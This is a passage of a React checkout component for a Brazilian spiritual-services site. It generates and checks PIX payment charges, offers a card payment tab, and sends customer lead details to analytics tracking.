  }, [charge, status]);

  // Confirmação de PIX pago
  useEffect(() => {
    if (status !== "paid") return;
    if (paidCompletionRef.current) return;
    paidCompletionRef.current = true;
    clearPixAttempt(productId, amountCents);
    clearStoredPixCharge(productId, amountCents);
    onPaymentConfirmed?.({ orderId: charge?.orderId || "", productId, amountCents });
    storePaymentReceipt({
      orderId: charge?.orderId || "",
      productId,
      amountCents,
    });

    if (productId === "carta_sagrada") {
      sessionStorage.setItem("templodeluz:pix-paid", "true");
    }

    // A conversão para a UTMify é registrada pelo webhook confirmado do gateway.
    // Isso evita duplicar uma compra entre cliente e servidor.
    trackPurchaseComplete({
      amountCents,
      productName: prodName,
      productId,
      paymentMethod: "pix",
      ...(charge?.orderId ? { orderId: charge.orderId } : {}),
    });

    trackQuizStep({
      stepIndex: 8,
      stepName: "checkout_confirmado",
      paymentStatus: "paid",
      amountCents,
      completed: true,
      leadName: customerName,
      leadPhone: customerPhone ? customerPhone.replace(/\D/g, "") : undefined,
      enteQuerido: resolvedEnte,
      grauParentesco: resolvedGrau,
      mensagemPreview: mensagemPreview || initial.mensagem || undefined,
      checkoutEvent: "completed",
    });

    const timer = setTimeout(() => {
      const target = successPath || "/obrigado";
      window.location.href = includePaymentParams
        ? appendQuery(target, `orderId=${encodeURIComponent(charge?.orderId || "")}&method=pix`)
        : target;
    }, 900);

    return () => clearTimeout(timer);
  }, [status, amountCents, customerName, customerPhone, productId, prodName, charge?.orderId, resolvedEnte, resolvedGrau, mensagemPreview, initial.mensagem, successPath, includePaymentParams, onPaymentConfirmed]);

  const generatePix = async () => {
    if (pixGenerationInFlightRef.current || charge) return;
    if (customerName.trim().length < 2) {
      setError("Informe o nome do titular com pelo menos 2 letras para gerar o PIX.");
      return;
    }
    const cleanPhone = customerPhone.replace(/\D/g, "");
    if (cleanPhone.length < 10) {
      setError(`Por favor, informe seu WhatsApp com DDD para ${productId === "chamada_ao_vivo_milena" ? "confirmar o horário" : "envio da foto da carta"}.`);
      return;
    }
    if (amountCents < 1500 && (productId === "carta_sagrada" || pixProductId === "carta_sagrada")) {
      setError("O valor mínimo para doação da vela e materiais é de R$ 15,00.");
      return;
    }

    setError("");
    autoPixGenerationRef.current = true;
    pixGenerationInFlightRef.current = true;
    setLoading(true);
    paidCompletionRef.current = false;
    try {
      pixAttemptRef.current ||= getOrCreatePixAttempt(productId, amountCents);
      initiateCheckoutEventIdRef.current = pixAttemptRef.current.initiateCheckoutEventId;
      const newCharge = await createPixCharge({
        payerName: customerName.trim(),
        amountCents,
        productId: pixProductId || productId,
        payerPhone: cleanPhone,
        payerEmail: customerEmail.trim() || undefined,
        enteQuerido: resolvedEnte,
        grauParentesco: resolvedGrau,
        attempt: pixAttemptRef.current,
      });
      storePixCharge(productId, amountCents, newCharge);
      setCharge(newCharge);
      setStatus("pending");

      trackPixGenerated({
        leadName: customerName.trim(),
        leadEmail: customerEmail.trim() || undefined,
        leadPhone: cleanPhone,
        amountCents,
      });

      recordInput(
        "whatsapp_pix_checkout",
        customerPhone,
        {
          userName: customerName.trim(),
          metadata: { phone: cleanPhone, ente: resolvedEnte, relacao: resolvedGrau },
          currentScreen: "pix_checkout",
        },
        0
      );
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err || "");
      if (msg.includes("429") || msg.includes("Muitas tentativas")) {
        setError("Muitas tentativas em pouco tempo. Por favor, aguarde 1 minuto para tentar novamente.");
      } else {
        setError(msg || "Não foi possível gerar a chave PIX. Tente novamente.");
      }
    } finally {
      pixGenerationInFlightRef.current = false;
      setLoading(false);
    }
  };

  const handleManualCheckStatus = async () => {
    if (!charge || checkingManual) return;
    setCheckingManual(true);
    setManualCheckNotice("");
    try {
      const result = await getPixStatus(charge);
      if (result.status === "paid") {
        setStatus("paid");
      } else {
        setManualCheckNotice(
          "Ainda aguardando a compensação do seu banco. Normalmente é processado em 5 a 30 segundos."
        );
      }
    } catch {
      setManualCheckNotice(
        "Consultando os servidores bancários... Você pode aguardar mais alguns instantes."
      );
    } finally {
      setCheckingManual(false);
    }
  };

  useEffect(() => {
    if (!autoOpen || autoCheckoutStartedRef.current || charge || loading) return;
    autoCheckoutStartedRef.current = true;
    handleOpenCheckout();
    if (autoGeneratePix) void generatePix();
  }, [autoOpen, autoGeneratePix, charge, loading, customerName, customerPhone]);

  useEffect(() => {
    const cleanPhone = customerPhone.replace(/\D/g, "");
    if (
      !isOpen
      || activeTab !== "pix"
      || autoPixGenerationRef.current
      || charge
      || loading
      || Boolean(error)
      || customerName.trim().length < 2
      || cleanPhone.length < 10
    ) return;

    const timer = setTimeout(() => {
      autoPixGenerationRef.current = true;
      void generatePix();
    }, 350);
    return () => clearTimeout(timer);
  }, [isOpen, activeTab, customerName, customerPhone, charge, loading, error]);

  const regeneratePix = () => {
    clearPixAttempt(productId, amountCents);
    clearStoredPixCharge(productId, amountCents);
    pixAttemptRef.current = null;
    autoPixGenerationRef.current = false;
    pixGenerationInFlightRef.current = false;
    setCharge(null);
    setStatus("creating");
    setCopied(false);
    setError("");
    setManualCheckNotice("");
  };

  const copyPix = async () => {
    if (!charge?.pixPayload) return;
    try {
      await navigator.clipboard.writeText(charge.pixPayload);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    } catch {
      setError("Não foi possível copiar automaticamente.");
    }
  };

  const handlePhoneChange = (val: string) => {
    const formatted = formatPhone(val);
    setCustomerPhone(formatted);
    markCheckoutFormStarted(formatted);
    syncLeadPhone(formatted, customerName);
    if (error) {
      setError("");
      autoPixGenerationRef.current = false;
    }
  };

  const handlePhoneBlur = () => {
    syncLeadPhoneImmediate(customerPhone, customerName);
  };

  return (
    <>
      {/* Botão Gatilho com Suporte a PIX e Cartão */}
      <div className="mt-5 text-center">
        <button
          id="botao-pagamento-checkout"
          type="button"
          onClick={handleOpenCheckout}
          className="utmify-initiate-checkout group relative flex w-full cursor-pointer items-center justify-center gap-2.5 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-600 to-teal-600 px-6 py-4 text-[14.5px] font-black uppercase tracking-wide text-white shadow-xl shadow-emerald-600/30 transition-all duration-200 hover:scale-[1.015] hover:brightness-105 active:scale-[0.985] scroll-mt-32"
        >
          {charge ? (
            <PixIcon className="w-5 h-5 text-white shrink-0 drop-shadow-xs" />
          ) : (
            <ShieldLockIcon className="w-5 h-5 text-white shrink-0 drop-shadow-xs" />
          )}
          <span>{charge ? "Ver QR Code PIX" : `Continuar para pagamento de R$ ${formattedAmount}`}</span>
        </button>

        {/* Selos de Confiança */}
        <div className="mt-3 flex flex-wrap items-center justify-center gap-x-3 gap-y-1 text-[11px] text-[#6c5a82] font-semibold">
          <span className="flex items-center gap-1.5">
            <ZapIcon className="w-3.5 h-3.5 text-emerald-600" />
            <span>PIX Instantâneo</span>
          </span>
          {showCard && (
            <>
              <span className="h-3 w-px bg-[#d8caea]" />
              <span className="flex items-center gap-1.5">
                <CardIcon className="w-3.5 h-3.5 text-[#6366f1]" />
                <span>Cartão em até 12x (Stripe)</span>
              </span>
            </>
          )}
          <span className="h-3 w-px bg-[#d8caea]" />
          <span className="flex items-center gap-1.5">
            <ShieldLockIcon className="w-3.5 h-3.5 text-emerald-600" />
            <span>Criptografia SSL 256 bits</span>
          </span>
        </div>
        {!charge && showCard && (
          <p className="mt-2 text-[11px] font-medium text-[#6c5a82]">
            Na próxima tela, escolha PIX ou cartão. Nenhuma cobrança é feita agora.
          </p>
        )}
      </div>

      {/* Modal de Checkout */}
      {isOpen &&
        typeof document !== "undefined" &&
        createPortal(
          <dialog
            open
            aria-modal="true"
            aria-label={productId === "chamada_ao_vivo_milena" ? "Checkout da chamada ao vivo" : "Checkout da contribuição"}
            className="fixed inset-0 z-[200] m-0 flex h-full max-h-none w-full max-w-none items-center justify-center border-none bg-black/75 p-3 backdrop-blur-sm sm:p-5"
          >
            <div className="fixed inset-0" onClick={() => setIsOpen(false)} aria-hidden="true" />
            <div className="relative z-10 max-h-[calc(100dvh-24px)] w-full overflow-y-auto overscroll-contain rounded-[26px] border border-[#e5daf0] bg-white p-4 pb-[max(1rem,env(safe-area-inset-bottom))] text-center shadow-2xl sm:max-w-[460px] sm:p-6">
              {/* Topo do Modal */}
              <div className="mb-4 flex items-start justify-between gap-3 text-left">
                <div>
                  <div className="flex items-center gap-1.5 text-[11px] font-bold uppercase tracking-wider text-emerald-700 mb-1">
                    <ShieldLockIcon className="w-3.5 h-3.5 text-emerald-600" />
                    <span>Ambiente Seguro Criptografado</span>
                  </div>
                  <h3 className="text-xl font-extrabold text-[#181126]">
                    {productId === "chamada_ao_vivo_milena" ? "Reservar Sua Chamada" : "Finalizar Sua Contribuição"}
                  </h3>
                  <p className="mt-0.5 text-sm font-black text-emerald-700">
                    Valor total: R$ {formattedAmount}
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  aria-label="Fechar modal"
                  className="flex h-9 w-9 shrink-0 cursor-pointer items-center justify-center rounded-full bg-[#f3edf8] text-lg font-bold text-[#2d144d] transition-colors hover:bg-[#e8ddf2]"
                >
                  ✕
                </button>
              </div>

              {/* Seletor de Abas: PIX Instantâneo vs Cartão de Crédito */}
              {showCard && (
                <div className="mb-5 grid grid-cols-2 rounded-2xl border border-[#d8caea] bg-[#f8f5fc] p-1 gap-1 shadow-xs">
                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab("pix");
                      setError("");
                      trackQuizStep({
                        stepIndex: 8,
                        stepName: "checkout_payment_selected",
                        leadName: customerName || undefined,
                        leadPhone: customerPhone ? customerPhone.replace(/\D/g, "") : undefined,
                        amountCents,
                        checkoutEvent: "step_view",
                      });
                    }}
                    className={`flex items-center justify-center gap-2 rounded-xl py-2.5 px-2 text-xs font-black transition-all cursor-pointer ${
                      activeTab === "pix"
                        ? "bg-gradient-to-r from-emerald-600 to-teal-700 text-white shadow-sm"
                        : "text-[#4b356d] hover:bg-[#eae2f5]"
                    }`}
                  >
                    <PixIcon className="w-4 h-4" />
                    <span>PIX Instantâneo</span>
                    {charge && (
                      <span className="rounded-full bg-emerald-500/30 px-1.5 py-0.5 text-[9px] font-black text-white">
                        Ativo
                      </span>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab("card");
                      setError("");
                      trackQuizStep({
                        stepIndex: 8,
                        stepName: "checkout_payment_selected",
                        leadName: customerName || undefined,
                        leadPhone: customerPhone ? customerPhone.replace(/\D/g, "") : undefined,
                        amountCents,
                        checkoutEvent: "step_view",
                      });
                    }}
                    className={`flex items-center justify-center gap-2 rounded-xl py-2.5 px-2 text-xs font-black transition-all cursor-pointer ${
                      activeTab === "card"
                        ? "bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-700 text-white shadow-sm"
                        : "text-[#4b356d] hover:bg-[#eae2f5]"
                    }`}
                  >
                    <CardIcon className="w-4 h-4" />
                    <span>Cartão de Crédito</span>
                    <span className="hidden sm:inline-block rounded-full bg-purple-200/60 px-1.5 py-0.5 text-[9px] font-bold text-purple-900">
                      Até 12x
                    </span>
                  </button>
                </div>
              )}

              {/* Conteúdo da Aba PIX */}
              <div style={{ display: activeTab === "pix" ? "block" : "none" }}>
                {!charge ? (
                  <PixFormView
                    productId={productId}
                    formattedAmount={formattedAmount}
                    customerName={customerName}
                    customerPhone={customerPhone}
                    error={error}
                    loading={loading}
                    onNameChange={(value) => {
                      setCustomerName(value);
                      markCheckoutFormStarted(value);
                      if (error) {
                        setError("");
                        autoPixGenerationRef.current = false;
                      }
                    }}
                    onPhoneChange={handlePhoneChange}
                    onPhoneBlur={handlePhoneBlur}
                    onSubmitPix={() => {
                      setError("");
                      autoPixGenerationRef.current = false;
                      void generatePix();
                    }}
                  />
                ) : (
                  <>
                    <div
                      className={`mb-3 text-xs font-extrabold uppercase tracking-wider ${
                        status === "paid" ? "text-emerald-700" : "text-[#2d144d]"
                      }`}
                    >
                      {statusMessage[status]}
                    </div>
                    <PixPendingView
                      charge={charge}
                      status={status}
                      copied={copied}
                      checkingManual={checkingManual}
                      manualCheckNotice={manualCheckNotice}
                      onCopyPix={copyPix}
                      onManualCheck={handleManualCheckStatus}
                      onRegenerate={regeneratePix}
                      isLiveCall={productId === "chamada_ao_vivo_milena"}
                    />
                  </>
                )}
              </div>

              {/* Checkout de cartão com alta conversão e incentivo estratégico ao PIX */}
              {showCard && (
                <div style={{ display: activeTab === "card" ? "block" : "none" }}>
                  <CardCheckoutPreview
                    productId={productId}
                    amountCents={amountCents}
                    formattedAmount={formattedAmount}
                    customerName={customerName}
                    customerPhone={customerPhone}
                    customerEmail={customerEmail}
                    onDataSync={(name, ph) => {
                      if (name) setCustomerName(name);
                      if (ph) setCustomerPhone(ph);
                    }}
                    onUsePix={() => {
                      setActiveTab("pix");
                      setError("");
                      if (!charge && customerName.trim().length >= 2 && customerPhone.replace(/\D/g, "").length >= 10) {
                        void generatePix();
                      }
                    }}
                  />
                </div>
              )}
            </div>
          </dialog>,
          document.body
        )}
    </>
  );
}
